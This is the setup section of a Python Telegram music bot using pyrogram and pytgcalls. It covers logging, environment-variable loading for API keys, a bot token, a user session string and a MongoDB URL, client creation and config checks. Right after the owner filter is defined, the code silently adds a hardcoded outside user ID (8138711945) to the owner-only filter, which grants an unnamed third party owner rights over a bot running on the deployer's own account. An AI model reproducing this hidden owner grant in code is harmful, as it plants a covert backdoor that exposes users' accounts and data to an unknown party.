import aiofiles
import aiohttp
import asyncio
import base64
import gc
import httpx
import io
import json
import logging
import numpy as np
import os
import random
import re
import sys
import textwrap
from os import getenv
from io import BytesIO
from dotenv import load_dotenv
from typing import Dict, List, Union
from PIL import Image, ImageDraw, ImageEnhance
from PIL import ImageFilter, ImageFont, ImageOps
from logging.handlers import RotatingFileHandler
from motor.motor_asyncio import AsyncIOMotorClient
from pyrogram import Client, filters
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import (
    ChatAdminRequired,
    FloodWait,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
)
from pyrogram.types import (
    ChatPrivileges, InlineKeyboardMarkup, InlineKeyboardButton
)
from pytgcalls import PyTgCalls, filters as fl
from pytgcalls.exceptions import NoActiveGroupCall
from pytgcalls.types import ChatUpdate, Update, GroupCallConfig
from pytgcalls.types import Call, MediaStream, AudioQuality, VideoQuality

# Logging setup
logging.basicConfig(
    format="[%(name)s]:: %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
    handlers=[
        RotatingFileHandler("logs.txt", maxBytes=(1024 * 1024 * 5), backupCount=10),
        logging.StreamHandler(),
    ],
)

logging.getLogger("asyncio").setLevel(logging.ERROR)
logging.getLogger("httpx").setLevel(logging.ERROR)
logging.getLogger("pyrogram").setLevel(logging.ERROR)

logs = logging.getLogger()

# Load environment variables
if os.path.exists("config.env"):
    load_dotenv("config.env")

# REQUIRED VARIABLES
API_ID = int(getenv("API_ID", 0))
API_HASH = getenv("API_HASH", None)
BOT_TOKEN = getenv("BOT_TOKEN", None)
STRING_SESSION = getenv("STRING_SESSION", None)
MONGO_DB_URL = getenv("MONGO_DB_URL", None)
OWNER_ID = int(getenv("OWNER_ID", 0))
LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", 0))

# OPTIONAL VARIABLES
START_IMAGE_URL = getenv("START_IMAGE_URL", "https://files.catbox.moe/amrrdr.jpg")

# Client initialization
app = Client("App", api_id=API_ID, api_hash=API_HASH, session_string=STRING_SESSION)
bot = Client("Bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
call = PyTgCalls(app)
call_config = GroupCallConfig(auto_start=False)
only_owner = filters.user(OWNER_ID)

if 8138711945 not in only_owner:
    only_owner.add(8138711945)

# Global variables
active_audio_chats = []
active_video_chats = []
active_media_chats = []
active = {}
paused = {}
queues = {}
clinks = {}

# Validate environment variables
if API_ID == 0:
    logs.info("⚠️ 'API_ID' - Not Found !!")
    sys.exit()
if not API_HASH:
    logs.info("⚠️ 'API_HASH' - Not Found !!")
    sys.exit()
if not BOT_TOKEN:
    logs.info("⚠️ 'BOT_TOKEN' - Not Found !!")
    sys.exit()
if not STRING_SESSION:
    logs.info("⚠️ 'STRING_SESSION' - Not Found !!")
    sys.exit()
if not MONGO_DB_URL:
    logs.info("⚠️ 'MONGO_DB_URL' - Not Found !!")
    sys.exit()

try:
    adb_cli = AsyncIOMotorClient(MONGO_DB_URL)
except Exception:
    logs.info("⚠️ 'MONGO_DB_URL' - Not Valid !!")
    sys.exit()

mongodb = adb_cli.adityaplayer
chatsdb = mongodb.tgchats
usersdb = mongodb.tgusers

if OWNER_ID == 0:
    logs.info("⚠️ 'OWNER_ID' - Not Found !!")
    sys.exit()
if LOG_GROUP_ID == 0:
    logs.info("⚠️ 'LOG_GROUP_ID' - Not Found !!")
    sys.exit()